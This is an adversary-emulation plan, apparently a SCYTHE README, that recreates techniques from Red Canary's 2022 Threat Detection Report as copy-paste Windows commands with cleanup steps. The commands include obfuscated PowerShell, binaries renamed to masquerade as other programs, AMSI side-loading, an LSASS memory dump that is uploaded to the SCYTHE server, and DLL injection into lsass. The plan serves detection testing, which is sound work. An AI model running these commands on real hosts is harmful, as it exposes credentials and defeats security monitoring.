# Red Canary - Emulation Plan

Red Canary is legitimate company and not a threat actor. However, they release actionable Cyber Threat Intelligece and hence why we have added it to our community threats GitHub.

## 2022 Threat Detection Report
Red Canary released the 2022 Threat Detection Report in March 2022 and it includes the top techniques they observed over the past year: https://redcanary.com/threat-detection-report/techniques/ 

### Automated Emulation with SCYTHE
This threat chains together the top techniques from the Red Canary 2022 Threat Detection Report.

1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/RedCanary
4. Create a new campaign `RedCanary2022TDR` with HTTPS
5. Import from Existing Threat: `RedCanary2022TDR`
6. Launch the Campaign

### Manual Emulation with SCYTHE
You can manually execute each technique provided in the Red Canary 2022 Threat Detection Report on a SCYTHE shell:
```
loader --load run
run powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
run cmd.exe "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt"
run rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\notepad.exe
run wmic /node:"127.0.0.1" process call create "calc.exe"
run powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt
run schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR "cmd /c date /T > C:\Windows\Temp\current_date.txt"
loader --load downloader
downloader --src VFS:/shared/threats/RedCanary/obfuscation.ps1 --dest .\obfuscation.ps1
run powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; .\obfuscation.ps1
run cmd.exe /c copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\notepad.exe
run cmd.exe /c C:\Windows\Temp\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
downloader --src VFS:/shared/threats/RedCanary/tweet.ps1 --dest .\tweet.ps1
run powershell Set-ExecutionPolicy Bypass -Scope Process -Force ; .\tweet.ps1
run cmd.exe /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
run cmd.exe /c copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
run cmd.exe /c %APPDATA%\updater.exe -Command exit
controller --integrity
If step 18 does not contain "High" goto step 24
run powershell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full
loader --load uploader
uploader --remotepath C:\Windows\Temp\lsass.dmp
run powershell mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll
STEP = CLEANUP
run wmic process where name="notepad.exe" delete
run wmic process where name="Calculator.exe" delete
run cmd.exe /c del hello.txt
run cmd.exe /c del tweet.ps1
run cmd.exe /c del obfuscation.ps1
run cmd.exe /c del LICENSE.txt
run cmd.exe /c del C:\Windows\Temp\notepad.exe
run cmd.exe /c del C:\Windows\Temp\svchost.exe
run cmd.exe /c del %APPDATA%\updater.exe
run cmd.exe /c del %APPDATA%\amsi.dll
run schtasks /Delete /TN CMDTestTask /F
controller --integrity
If step 35 does not contain "High" goto step 38
run cmd.exe /c del C:\Windows\Temp\lsass.dmp
controller --shutdown
```

### Manual Emulation without SCYTHE
You can manually execute each technique provided in the Red Canary 2022 Threat Detection Report on a target host by copying and pasting these procedures:
1.  `powershell.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==`
    * Execute this from a non-privileged cmd.exe
2. `%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `del hello.txt` 
3. `rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\notepad.exe`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `wmic process where name="notepad.exe" delete`
4. `wmic /node:"127.0.0.1" process call create “calc.exe”`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `wmic process where name="calc.exe" delete`
    * Note the version of Windows may call the process `Calculator.exe` or `CalculatorApp.exe`
5. `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\Windows\Temp\lsass.dmp full`
    * Execute this from a privileged cmd.exe
    * Clean up by executing: `del C:\Windows\Temp\lsass.dmp`     
6. `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt`
    * Execute this from a non-privileged powershell.exe
    * Clean up by executing: `wmic process where name="notepad.exe" delete`   
    * Clean up by executing: `del LICENSE.txt`
7. `mavinject.exe ((Get-Process lsass).Id) /INJECTRUNNING C:\Windows\System32\vbscript.dll`
    * Execute this from a privileged powershell.exe
    * Clean up by rebooting
8. `schtasks /Create /F /SC MINUTE /MO 3 /ST 07:00 /TN CMDTestTask /TR ""cmd /c date /T > C:\Windows\Temp\current_date.txt"`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `schtasks /Delete /TN CMDTestTask /F`
9. ```$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )```
    * Execute this from a non-privileged powershell.exe
10. `copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\notepad.exe` & `C:\Windows\Temp\notepad.exe -e JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `del C:\Windows\Temp\notepad.exe`
11. `Set-ExecutionPolicy Bypass -Scope Process -Force ; .\tweet.ps1`
    * Download tweet.ps1 to the working directory 
    * Execute this from a non-privileged powershell.exe
    * Clean up by executing: `del $Env:windir\Temp\svchost.exe`
12. `copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe` & `copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll` & `%APPDATA%\updater.exe -Command exit`
    * Execute this from a non-privileged cmd.exe
    * Clean up by executing: `del %APPDATA%\updater.exe` & `del %APPDATA%\amsi.dll`